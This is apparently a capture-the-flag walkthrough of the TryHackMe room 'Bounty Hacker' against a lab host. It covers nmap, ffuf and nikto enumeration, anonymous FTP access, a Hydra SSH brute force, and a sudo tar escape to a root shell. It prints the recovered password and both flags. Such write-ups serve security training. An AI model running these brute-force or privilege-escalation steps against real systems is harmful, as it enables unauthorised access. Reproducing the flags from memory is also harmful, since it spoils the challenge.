# Bounty Hacker - Easy

<details>
<summary>nmap scan</summary>

```nmap -T4 -p- -A 10.10.11.56```

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
ftp-syst:
    STAT:
    FTP server status:
        Connected to ::ffff:10.17.48.136
        Logged in as ftp
        TYPE: ASCII
        No session bandwidth limit
        Session timeout in seconds is 300
        Control connection is plain text
        Data connections will be plain text
        At session startup, client count was 1
        vsFTPd 3.0.3 - secure, fast, stable
End of status
ftp-anon: Anonymous FTP login allowed (FTP code 230)
    -rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
    -rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
ssh-hostkey:
    2048 dc:f8:df:a7:a6:00:6d:18:b0:70:2b:a5:aa:a6:14:3e (RSA)
    256 ec:c0:f2:d9:1e:6f:48:7d:38:9a:e3:bb:08:c4:0c:c9 (ECDSA)
    256 a4:1a:15:a5:d4:b1:cf:8f:16:50:3a:7d:d0:d8:13:c2 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
    http-title: Site doesn't have a title (text/html).
    http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

</details>

<br>

* ffuf scan: ```ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.11.56/FUZZ -s```

```markdown
.htaccess
.htpasswd
.hta
images
server-status
```

* nikto scan: ```nikto -h 10.10.11.56```

```markdown
- Server: Apache/2.4.18 (Ubuntu)
- The anti-clickjacking X-Frame-Options header is not present.
- The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
- The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
- No CGI Directories found (use '-C all' to force check all possible dirs)
- Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
- IP address found in the 'location' header. The IP is "127.0.1.1".
- OSVDB-630: The web server may reveal its internal or real IP in the Location header via a request to /images over HTTP/1.0. The value is "127.0.1.1".
- Server may leak inodes via ETags, header found with file /, inode: 3c9, size: 5a789fef9846b, mtime: gzip
- Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
- OSVDB-3268: /images/: Directory indexing found.
- OSVDB-3233: /icons/README: Apache default file found.
```

* The website <http://10.10.11.56> contains some context to the question, but nothing much useful.

* Viewing the page source also does not give us any clue.

* However, we can use our hints from the enumeration to discover any exploit.

* The /images directory in the website contains only the image shown on the website itself, so nothing useful so far.

* As the ftp service on port 21 allows Anonymous login, we can check if there are any files there

* ```ftp 10.10.11.56``` (use anonymous as username)

```markdown
passive off (turns off passive mode)
binary (binary mode)
dir (shows two text files)
mget *.txt (get all files matching wildcard to local system)
```

* So, now we have two text files from the ftp server.

* The locks.txt file contains a list of usernames/passwords; we could use that while brute-forcing SSH using Hydra.

* The task.txt file contains the name 'Vicious' and mentions something about 'Red Eye'.

* We can now attempt to brute force SSH.

* Brute-force as lin: ```hydra -l lin -P locks.txt 10.10.11.56 ssh```

* This gives us the password RedDr4gonSynd1cat3

* We can login using SSH now: ```ssh lin@10.10.11.56```

* user.txt: ```THM{CR1M3_SyNd1C4T3}```

* We need to attempt privilege escalation now

* ```history``` shows us that someone before us has tried to clear the .bash_history file

* To find files with SUID bit set: ```find / -perm -u=s -type f 2>/dev/null```

* This does not give us any desirable output

* To check sudo rights: ```sudo -l```

* This shows that we can run /bin/tar as root

* Our next step is to check GTFObins for any exploits related to tar

* There does exist an exploit for tar: ```sudo /bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh```

* This gives us the root access

* root.txt: ```THM{80UN7Y_h4cK3r}```
